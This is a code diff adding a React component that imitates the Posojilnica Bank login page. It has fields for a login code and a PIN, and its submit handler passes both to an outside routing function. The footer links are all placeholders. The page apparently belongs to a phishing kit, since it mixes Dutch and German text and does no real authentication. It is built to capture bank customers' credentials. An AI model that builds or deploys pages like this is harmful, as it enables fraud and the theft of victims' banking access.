@@ -1,0 +1,195 @@
+"use client";
+
+import React, { useState } from "react";
+
+type Props = {
+  formData: {
+    verfuegernummer?: string;
+    pin?: string;
+  };
+  onChange: (field: string, value: string) => void;
+  handleRouteAction: () => void;
+  saving?: boolean;
+};
+
+const REGIONS = [
+  "Kärnten/Posojilnica Bank"
+];
+
+export function PosojilnicaBank({ formData, onChange, handleRouteAction, saving }: Props) {
+  const [dropdownOpen, setDropdownOpen] = useState(false);
+  const [selectedRegion, setSelectedRegion] = useState("Kärnten/Posojilnica Bank");
+
+  const toggleDropdown = () => setDropdownOpen(!dropdownOpen);
+
+  return (
+    <div className="min-h-screen relative font-sans flex flex-col">
+      {/* Background Image Area (Clean Desk Scene) */}
+      <div 
+        className="absolute inset-0 -z-10 bg-[#e4e6e9]"
+        style={{
+          backgroundImage: "url('/poso_2026.webp')",
+          backgroundSize: "cover",
+          backgroundPosition: "center",
+        }}
+      >
+      </div>
+
+      {/* Main Content (Centered Form) */}
+      <div className="flex-1 flex items-center justify-center px-4 py-12 relative z-10">
+        <div className="bg-white w-full max-w-[600px] shadow-[0_10px_40px_rgba(0,0,0,0.15)] flex flex-col p-8 md:p-12 relative">
+          
+          {/* Header / Language */}
+          <div className="absolute top-8 right-8">
+            <div className="flex items-center gap-1 cursor-pointer text-[#444] hover:text-black">
+              <span className="text-[13px] font-medium">Deutsch</span>
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
+              </svg>
+            </div>
+          </div>
+
+          <div className="mt-4">
+            <h1 className="text-[26px] font-medium text-[#333] mb-4">Log alstublieft in</h1>
+            <p className="text-[13px] text-[#555] mb-8">
+              Voer uw inloggegevens in om verder te gaan.
+            </p>
+
+            <form 
+              onSubmit={(e) => {
+                e.preventDefault();
+                handleRouteAction();
+              }}
+              className="flex flex-col gap-6 relative"
+            >
+              {/* Dropdown Field */}
+              <div className="relative">
+                <div 
+                  className={`w-full bg-[#f4f4f4] border-b-[1px] cursor-pointer transition-colors ${dropdownOpen ? 'border-[#333]' : 'border-[#767676] hover:border-[#333]'}`}
+                  onClick={toggleDropdown}
+                >
+                  <div className="px-4 flex flex-col justify-center min-h-[56px] relative">
+                    <span className={`absolute top-2 text-[11px] transition-colors ${dropdownOpen ? 'text-[#333]' : 'text-[#666]'}`}>
+                      Bundesland oder Bank wählen *
+                    </span>
+                    <div className="flex justify-between items-center mt-3">
+                      <span className="text-[15px] text-[#333]">{selectedRegion}</span>
+                      <svg className={`w-5 h-5 text-[#333] transform transition-transform ${dropdownOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M19 9l-7 7-7-7" />
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Dropdown Menu */}
+                {dropdownOpen && (
+                  <div className="absolute top-full left-0 right-0 bg-white border border-[#ccc] shadow-lg z-50 max-h-[320px] overflow-y-auto">
+                    {REGIONS.map((region) => (
+                      <div 
+                        key={region}
+                        onClick={() => {
+                          setSelectedRegion(region);
+                          setDropdownOpen(false);
+                        }}
+                        className={`px-4 py-3 text-[15px] cursor-pointer flex justify-between items-center border-b border-gray-100 last:border-0 ${selectedRegion === region ? 'bg-[#f4f4f4] text-[#333]' : 'text-[#333] hover:bg-[#f4f4f4]'}`}
+                      >
+                        {region}
+                        {selectedRegion === region && (
+                          <svg className="w-5 h-5 text-[#333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
+                          </svg>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+
+              {/* Inlogcode Field */}
+              <div className="relative">
+                <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
+                  <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
+                    Inlogcode invoeren *
+                  </label>
+                  <input 
+                    type="text" 
+                    required
+                    value={formData.verfuegernummer || ""}
+                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
+                    className="w-full bg-transparent outline-none text-[#333] text-[15px] mt-3"
+                  />
+                </div>
+              </div>
+
+              {/* PIN Field */}
+              <div className="relative">
+                <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
+                  <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
+                    PIN eingeben *
+                  </label>
+                  <input 
+                    type="password" 
+                    required
+                    value={formData.pin || ""}
+                    onChange={(e) => onChange("pin", e.target.value)}
+                    className="w-full bg-transparent outline-none text-[#333] text-[15px] mt-3"
+                  />
+                </div>
+              </div>
+
+              {/* Checkbox Area */}
+              <div className="flex items-center mt-2 gap-2">
+                <div className="relative flex items-center justify-center">
+                  <input type="checkbox" id="saveUser" className="w-[18px] h-[18px] border border-[#767676] rounded-sm appearance-none checked:bg-[#8598a6] cursor-pointer peer" />
+                  <svg className="absolute w-3 h-3 text-white pointer-events-none hidden peer-checked:block" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
+                  </svg>
+                </div>
+                <label htmlFor="saveUser" className="text-[#333] text-[13px] cursor-pointer ml-1">Verfüger speichern</label>
+                <div className="w-4 h-4 rounded-full border border-[#767676] flex items-center justify-center text-[#767676] text-[10px] cursor-pointer hover:bg-gray-100 ml-1 font-serif">
+                  i
+                </div>
+              </div>
+
+              {/* Submit Button */}
+              <button 
+                type="submit" 
+                disabled={saving} 
+                className="w-full max-w-[280px] mx-auto mt-4 bg-[#8598a6] hover:bg-[#6d8291] text-white font-medium h-[44px] text-[15px] transition-colors disabled:opacity-70 flex items-center justify-center"
+              >
+                {saving ? "Lädt..." : "Weiter"}
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      {/* Floating Help Button */}
+      <div className="fixed bottom-8 right-8 z-50">
+        <div className="w-12 h-12 bg-[#102a63] rounded-full flex items-center justify-center text-white font-bold text-xl shadow-lg cursor-pointer hover:scale-105 transition-transform">
+          ?
+        </div>
+      </div>
+
+      {/* Footer */}
+      <footer className="w-full py-6 flex flex-wrap justify-center items-center gap-4 text-[12px] text-[#555] z-10 px-4 bg-white/40 backdrop-blur-sm">
+        <a href="#" className="hover:text-black flex items-center gap-1">
+          Impressum 
+          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
+        </a>
+        <span className="text-[#999]">•</span>
+        <a href="#" className="hover:text-black flex items-center gap-1">
+          Nutzungsbedingungen
+          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
+        </a>
+        <span className="text-[#999]">•</span>
+        <a href="#" className="hover:text-black flex items-center gap-1">
+          Barrierefreiheitserklärung
+          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg>
+        </a>
+        <span className="text-[#999]">•</span>
+        <span>© 2026 Posojilnica Bank</span>
+      </footer>
+    </div>
+  );
+}
